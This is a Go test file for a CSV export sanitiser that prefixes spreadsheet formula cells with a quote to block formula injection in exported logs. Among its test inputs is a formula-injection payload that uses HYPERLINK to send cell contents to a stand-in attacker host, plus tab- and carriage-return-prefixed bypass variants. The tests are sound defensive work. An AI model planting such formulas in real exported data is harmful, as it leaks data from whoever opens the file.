package services

import "testing"

// A log message is attacker-influenced text: a username, a search term, a
// string an API echoed back. Excel, Sheets and LibreOffice all execute a cell
// beginning =, +, - or @, so exporting one and opening it runs whatever was
// logged.
func TestCsvCellsThatWouldRunAreNeutralised(t *testing.T) {
	for _, tc := range []struct {
		name string
		cell string
		want string
	}{
		{"exfiltration via hyperlink",
			`=HYPERLINK("http://evil.test/?"&A1,"ok")`,
			`'=HYPERLINK("http://evil.test/?"&A1,"ok")`},
		{"plus", "+1+1", "'+1+1"},
		{"minus", "-1+1", "'-1+1"},
		{"at", "@SUM(A1:A9)", "'@SUM(A1:A9)"},

		// A leading tab or carriage return is skipped by the parser, which then
		// reads the formula behind it. A check on the first visible character
		// would miss both.
		{"tab then formula", "\t=1+1", "'\t=1+1"},
		{"carriage return then formula", "\r=1+1", "'\r=1+1"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := csvSafeCell(tc.cell); got != tc.want {
				t.Errorf("csvSafeCell(%q) = %q, want %q", tc.cell, got, tc.want)
			}
		})
	}
}

// The export is evidence. Ordinary text has to come out of it unchanged, or
// the fix costs more than the bug.
func TestOrdinaryCellsAreUntouched(t *testing.T) {
	for _, cell := range []string{
		"",
		"Payment declined",
		"user 4821 not found",
		`{"cart_id":"c_8f21a4"}`,
		"2026-08-19T12:00:00Z",
		"019fe59f-3839-7cf4-a9e7-1c2d3e4f9c41",
		"error",
		"true",
		"POST /v2/payments/confirm",
		// Not leading, so not a formula.
		"total=42",
	} {
		if got := csvSafeCell(cell); got != cell {
			t.Errorf("csvSafeCell(%q) changed it to %q", cell, got)
		}
	}
}

// Every column, not just the free-text ones. A uuid or a timestamp cannot
// begin with a dangerous character, so covering them costs nothing and means
// a column added later is covered without anybody remembering to.
func TestTheWholeRowIsCovered(t *testing.T) {
	row := csvSafeRow([]string{"ok", "=1+1", "", "@x"})

	want := []string{"ok", "'=1+1", "", "'@x"}
	for i := range want {
		if row[i] != want[i] {
			t.Errorf("column %d = %q, want %q", i, row[i], want[i])
		}
	}
}
